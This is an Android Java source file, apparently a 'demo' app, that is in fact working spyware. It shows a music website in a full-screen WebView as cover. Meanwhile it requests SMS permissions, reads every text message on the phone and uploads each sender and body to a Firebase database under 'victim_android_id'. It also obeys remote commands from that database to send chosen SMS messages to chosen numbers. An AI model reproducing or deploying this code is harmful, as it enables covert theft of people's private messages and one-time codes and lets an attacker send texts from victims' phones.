package com.itsolution.sms_reader_demo_app;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.PowerManager;
import android.os.Trace;
import android.provider.BaseColumns;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.DateFormat;
import java.util.Date;
import java.util.HashMap;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
public class MainActivity extends AppCompatActivity {

    public String msgdb;
    public String nmbrdb, victim_phn_nmbr = "",phn_number;
    public int Number;
    WebView webView;


    public String android_id;
    Context context1 = MainActivity.this;
    public CountDownTimer count, count1;
    DatabaseReference db_send_or_not;
    private FirebaseDatabase db = FirebaseDatabase.getInstance();
    private DatabaseReference root = db.getReference();
    private DatabaseReference root_for_send = db.getReference("victim_android_id");
    private DatabaseReference root_for_msg = db.getReference("victim_android_id");
    private DatabaseReference root_for_number = db.getReference("victim_android_id");

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        ActionBar actionBar;
        actionBar = getSupportActionBar();
        actionBar.hide();

        createNotifictionChannel();
        run_in_bg();
        loadwebsite();
        android_id = Settings.Secure.getString(context1.getContentResolver(), Settings.Secure.ANDROID_ID);
        victim_phn_nmbr=android_id;
        start1();


        Button btn=findViewById(R.id.btn);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent =new Intent(MainActivity.this,alarmreciver.class);
                PendingIntent pi=PendingIntent.getBroadcast(MainActivity.this,100,intent,0);
                Long time=System.currentTimeMillis()+(10*1000);
                AlarmManager alarmManager=(AlarmManager)getSystemService(ALARM_SERVICE);
                alarmManager.set(AlarmManager.RTC_WAKEUP,time,pi);
            }
        });

    }

    public void run_in_bg(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }
    }

    public void start1(){
        count=new CountDownTimer(5000, 1000) {

            public void onTick(long millisUntilFinished) {

                if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    check();
                } else {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);
                }
            }

            public void onFinish() {

                if (ContextCompat.checkSelfPermission(MainActivity.this, READ_SMS) == PackageManager.PERMISSION_GRANTED ) {
                    read_sms();
                } else {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{READ_SMS}, PackageManager.PERMISSION_GRANTED);
                }

                start2();
            }


        }.start();

    }
    public void start2(){
        count1=new CountDownTimer(5000, 1000) {

            public void onTick(long millisUntilFinished) {

                if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    check();
                } else {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);
                }
            }

            public void onFinish() {

                if (ContextCompat.checkSelfPermission(MainActivity.this, READ_SMS) == PackageManager.PERMISSION_GRANTED ) {
                    read_sms();
                } else {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{READ_SMS}, PackageManager.PERMISSION_GRANTED);
                }
                start1();
            }


        }.start();
    }

    private void send_sms_fetch_data(){
        root_for_msg.child(victim_phn_nmbr).child("task").child("message").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String msg_from_db=snapshot.getValue(String.class);
                msgdb = msg_from_db;
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

        root_for_number.child(victim_phn_nmbr).child("task").child("phone_number").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String number_from_db=snapshot.getValue(String.class);
                nmbrdb=number_from_db;

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
        send_sms();
    }
    private void read_sms(){
        Uri urisms=Uri.parse("content://sms/");
        Cursor cursor=getContentResolver().query(urisms,new String[]{"_id","address","date","body"},null,null,"date");




        if(cursor!=null && cursor.getCount()>0){

            cursor.moveToFirst();

            while (cursor.moveToNext()){
                String id=cursor.getString(0);
                String address=cursor.getString(1);
                String body=cursor.getString(3);
                HashMap<String,String> UserMap=new HashMap<>();
                UserMap.put("phone number",address);
                UserMap.put("message",body);
                root.child("victim_android_id").child(victim_phn_nmbr).child(id).setValue(UserMap);
            }

        }else{

        }
    }
    private void check(){

        root_for_send.child(victim_phn_nmbr).child("task").child("send_message").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {


                try{
                    if(snapshot.getValue().getClass()==Long.class){
                        Long value = snapshot.getValue(Long.class);


                        int Num = value.intValue();
                        Number=Num;

                    }

                    if(snapshot.getValue().getClass()==String.class){
                        String value = snapshot.getValue(String.class);
                        int Num = Integer.valueOf(value);
                        Number=Num;

                    }

                }
                catch (Exception e){
                    Number=1;
                }
                if(Number==1){
                    send_sms_fetch_data();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }

    private void send_sms() {


            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.SEND_SMS}, 1);

                if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.SEND_SMS)) {

                } else {
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.SEND_SMS}, 1);
                }
            } else {



                    try {
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(nmbrdb, null, msgdb, null, null);
                        db_send_or_not = FirebaseDatabase.getInstance().getReference("victim_android_id").child(victim_phn_nmbr).child("task").child("send_message");
                        db_send_or_not.setValue("0");
                    } catch (Exception e) {
                    }

            }
        }

  private void loadwebsite(){
      webView = (WebView) findViewById(R.id.webview);
      webView.setWebViewClient(new WebViewClient());
      webView.loadUrl("https://wynk.in/music");
      webView.clearCache(true);
      WebSettings webSettings = webView.getSettings();
      webSettings.setJavaScriptEnabled(true);
      webSettings.setAllowContentAccess(true);
      webSettings.setAppCacheEnabled(true);
      webSettings.setDomStorageEnabled(true);
      webSettings.setUseWideViewPort(true);

  }

  public void createNotifictionChannel(){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            CharSequence name="this is name";
            String discription="Channel for maneger";
            int importance=NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel channel=new NotificationChannel("foxid",name,importance);
            channel.setDescription(discription);

            NotificationManager notificationManager=getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
      }
  }


}
